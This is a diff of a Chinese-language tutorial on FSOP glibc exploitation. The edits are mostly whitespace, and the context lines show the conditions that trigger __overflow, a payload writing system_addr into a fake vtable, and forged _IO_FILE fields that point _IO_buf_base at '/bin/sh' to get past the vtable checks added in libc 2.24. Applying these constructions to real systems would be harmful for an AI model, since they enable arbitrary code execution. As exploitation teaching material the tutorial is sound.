@@ -83,7 +83,7 @@ int _IO_flush_all_lockp (int do_lock)
 		if (do_lock)
 			_IO_funlockfile (fp);
 		run_fp = NULL;
-		
+
 		if (last_stamp != _IO_list_all_stamp)
 		{
 			/* Something was added to the list.  Start all over again.  */
@@ -102,7 +102,7 @@ int _IO_flush_all_lockp (int do_lock)
 }
 </pre>
 触发\_\_overflow函数的条件（任选其一即可）：
-  
+
 	1. fp -> _mode <= 0  //表示使用字节流
 	2. fp -> _IO_write_ptr > fp -> _IO_write_base	//表示还有数据没有写入内核缓冲区  
 或者满足  
@@ -149,8 +149,6 @@ payload += p64(0)*2 + p64(system_addr) + p64(system_addr)
 </pre>
 ## 2. FSOP防御机制（libc2.24之后的利用方法） ##
 从libc2.24开始，加入了对于vtable的检查函数，即在<a href = "#6">2.3小节</a>提到的IO\_validata\_vtable和\_IO\_vtable\_check两个函数。
-
-**注：2.27版本中无\_IO\_flush\_all\_lockp函数（使用了其他函数代替）**  
 
 <pre class="prettyprint lang-javascript"> 
 static inline const struct _IO_jump_t *
@@ -347,10 +345,10 @@ void _IO_str_finish (_IO_FILE *fp, int dummy)
 所以可以像下面这样构造：
 
 	fp->_flag = 0
-    fp->_mode = 0
-    fp->_IO_write_ptr = 0xffffffff	
-    fp->_IO_write_base = 0		//_IO_write_ptr > _IO_write_base 即可
-    fp->_IO_buf_base = bin_sh_addr
+	fp->_mode = 0
+	fp->_IO_write_ptr = 0xffffffff	
+	fp->_IO_write_base = 0		//_IO_write_ptr > _IO_write_base 即可
+	fp->_IO_buf_base = bin_sh_addr
 
 完整的调用过程：
 
@@ -414,9 +412,9 @@ _IO_wint_t _IO_wstr_overflow (_IO_FILE *fp, _IO_wint_t c)
 	  		if (__glibc_unlikely (new_size < old_wblen)
 	      		|| __glibc_unlikely (new_size > SIZE_MAX / sizeof (wchar_t)))
 	    		return EOF;
-
+	
 	  		new_buf = (wchar_t *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size * sizeof (wchar_t));    // 在这个相对地址放上 system 的地址
-    [...]
+	[...]
 </pre>
 其他的都没有发生变化，唯一需要注意的就是其中条件判断的字段都变为了fp->\_wide_data字段。  
 
